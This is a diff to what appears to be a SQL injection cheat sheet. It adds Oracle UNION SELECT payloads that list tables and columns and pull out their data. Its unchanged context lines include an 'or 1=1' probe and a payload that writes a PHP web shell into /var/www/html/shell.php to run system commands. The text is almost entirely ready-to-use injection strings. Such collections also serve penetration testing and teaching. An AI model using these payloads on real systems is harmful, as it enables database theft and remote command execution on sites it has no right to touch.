@@ -44,3 +44,10 @@ www.example.com/xxx.php?id=1 or 1=1
 ```
 123' UNION SELECT '<?php echo system("ls -la /");?>','2','3','4','5' into outfile '/var/www/html/shell.php'#
 ```
+
+## Oracle DB
+```
+' UNION SELECT table_name,null,null FROM all_tables--
+' UNION SELECT  column_name,null,null FROM all_tab_columns WHERE table_name=''--
+' UNION SELECT [col1],[col2],null FROM [table]--
+```
